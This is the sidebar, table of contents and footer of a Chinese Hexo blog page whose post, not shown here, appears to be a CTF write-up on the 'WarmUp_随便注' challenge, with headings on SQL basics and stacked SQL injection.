              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">23</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                blogroll
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://eqqie.cn/" title="eqqie's blog" target="_blank">eqqie's blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.ragdoll.work/" title="��լ�ռ�" target="_blank">��լ�ռ�</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WarmUp-随便注"><span class="nav-number">1.</span> <span class="nav-text">WarmUp_随便注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言："><span class="nav-number">1.1.</span> <span class="nav-text">前言：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WarmUp"><span class="nav-number">1.1.1.</span> <span class="nav-text">WarmUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#随便注"><span class="nav-number">1.1.2.</span> <span class="nav-text">随便注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL"><span class="nav-number">1.2.</span> <span class="nav-text">SQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#语法"><span class="nav-number">1.2.1.</span> <span class="nav-text">语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-语句后面的分号？"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">SQL 语句后面的分号？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些最重要的-SQL-命令"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">一些最重要的 SQL 命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-SELECT-语句"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">SQL SELECT 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-SELECT-DISTINCT-语句"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">SQL SELECT DISTINCT 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-WHERE-子句"><span class="nav-number">1.2.1.5.</span> <span class="nav-text">SQL WHERE 子句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-AND-amp-OR-运算符"><span class="nav-number">1.2.1.6.</span> <span class="nav-text">SQL AND &amp; OR 运算符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-ORDER-BY-关键字"><span class="nav-number">1.2.1.7.</span> <span class="nav-text">SQL ORDER BY 关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-INSERT-INTO-语句"><span class="nav-number">1.2.1.8.</span> <span class="nav-text">SQL INSERT INTO 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-UPDATE-语句"><span class="nav-number">1.2.1.9.</span> <span class="nav-text">SQL UPDATE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-DELETE-语法"><span class="nav-number">1.2.1.10.</span> <span class="nav-text">SQL DELETE 语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-SELECT-TOP-LIMIT-ROWNUM-子句"><span class="nav-number">1.2.1.11.</span> <span class="nav-text">SQL SELECT TOP, LIMIT, ROWNUM 子句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-LIKE-操作符"><span class="nav-number">1.2.1.12.</span> <span class="nav-text">SQL LIKE 操作符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-LIKE-语法"><span class="nav-number">1.2.1.13.</span> <span class="nav-text">SQL LIKE 语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-通配符"><span class="nav-number">1.2.1.14.</span> <span class="nav-text">SQL 通配符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-IN-操作符"><span class="nav-number">1.2.1.15.</span> <span class="nav-text">SQL IN 操作符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-BETWEEN-操作符"><span class="nav-number">1.2.1.16.</span> <span class="nav-text">SQL BETWEEN 操作符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-别名"><span class="nav-number">1.2.1.17.</span> <span class="nav-text">SQL 别名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-JOIN"><span class="nav-number">1.2.2.</span> <span class="nav-text">SQL JOIN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-INNER-JOIN-关键字"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">SQL INNER JOIN 关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-LEFT-JOIN-关键字"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">SQL LEFT JOIN 关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-RIGHT-JOIN-关键字"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">SQL RIGHT JOIN 关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-FULL-OUTER-JOIN-关键字"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">SQL FULL OUTER JOIN 关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-UNION-操作符"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">SQL UNION 操作符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-SELECT-INTO-语句"><span class="nav-number">1.2.2.6.</span> <span class="nav-text">SQL SELECT INTO 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-INSERT-INTO-SELECT-语句"><span class="nav-number">1.2.2.7.</span> <span class="nav-text">SQL INSERT INTO SELECT 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-CREATE-DATABASE-语句"><span class="nav-number">1.2.2.8.</span> <span class="nav-text">SQL CREATE DATABASE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-CREATE-TABLE-语句"><span class="nav-number">1.2.2.9.</span> <span class="nav-text">SQL CREATE TABLE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-约束（Constraints）"><span class="nav-number">1.2.2.10.</span> <span class="nav-text">SQL 约束（Constraints）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-NOT-NULL-约束"><span class="nav-number">1.2.2.11.</span> <span class="nav-text">SQL NOT NULL 约束</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-UNIQUE-约束"><span class="nav-number">1.2.2.12.</span> <span class="nav-text">SQL UNIQUE 约束</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-PRIMARY-KEY-约束"><span class="nav-number">1.2.2.13.</span> <span class="nav-text">SQL PRIMARY KEY 约束</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-FOREIGN-KEY-约束"><span class="nav-number">1.2.2.14.</span> <span class="nav-text">SQL FOREIGN KEY 约束</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-CHECK-约束"><span class="nav-number">1.2.2.15.</span> <span class="nav-text">SQL CHECK 约束</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-DEFAULT-约束"><span class="nav-number">1.2.2.16.</span> <span class="nav-text">SQL DEFAULT 约束</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-CREATE-INDEX-语句"><span class="nav-number">1.2.2.17.</span> <span class="nav-text">SQL CREATE INDEX 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-撤销索引、撤销表以及撤销数据库"><span class="nav-number">1.2.2.18.</span> <span class="nav-text">SQL 撤销索引、撤销表以及撤销数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-ALTER-TABLE-语句"><span class="nav-number">1.2.2.19.</span> <span class="nav-text">SQL ALTER TABLE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AUTO-INCREMENT-字段"><span class="nav-number">1.2.2.20.</span> <span class="nav-text">AUTO INCREMENT 字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-NULL-值"><span class="nav-number">1.2.2.21.</span> <span class="nav-text">SQL NULL 值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-NULL-函数"><span class="nav-number">1.2.2.22.</span> <span class="nav-text">SQL NULL 函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-通用数据类型"><span class="nav-number">1.2.3.</span> <span class="nav-text">SQL 通用数据类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-数据类型快速参考手册"><span class="nav-number">1.2.4.</span> <span class="nav-text">SQL 数据类型快速参考手册</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-用于各种数据库的数据类型"><span class="nav-number">1.2.5.</span> <span class="nav-text">SQL 用于各种数据库的数据类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Microsoft-Access-数据类型"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">Microsoft Access 数据类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-数据类型"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">MySQL 数据类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-数据类型"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">SQL Server 数据类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他数据类型："><span class="nav-number">1.2.5.4.</span> <span class="nav-text">其他数据类型：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入"><span class="nav-number">1.3.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-原理介绍"><span class="nav-number">1.4.</span> <span class="nav-text">0x01 原理介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-堆叠注入的局限性"><span class="nav-number">1.5.</span> <span class="nav-text">0x02 堆叠注入的局限性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回溯"><span class="nav-number">1.6.</span> <span class="nav-text">回溯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL中show语法"><span class="nav-number">1.6.1.</span> <span class="nav-text">MySQL中show语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#method1"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">method1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql预编译"><span class="nav-number">1.6.2.</span> <span class="nav-text">mysql预编译</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#method2"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">method2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bb两句："><span class="nav-number">1.6.3.</span> <span class="nav-text">bb两句：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">1.7.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
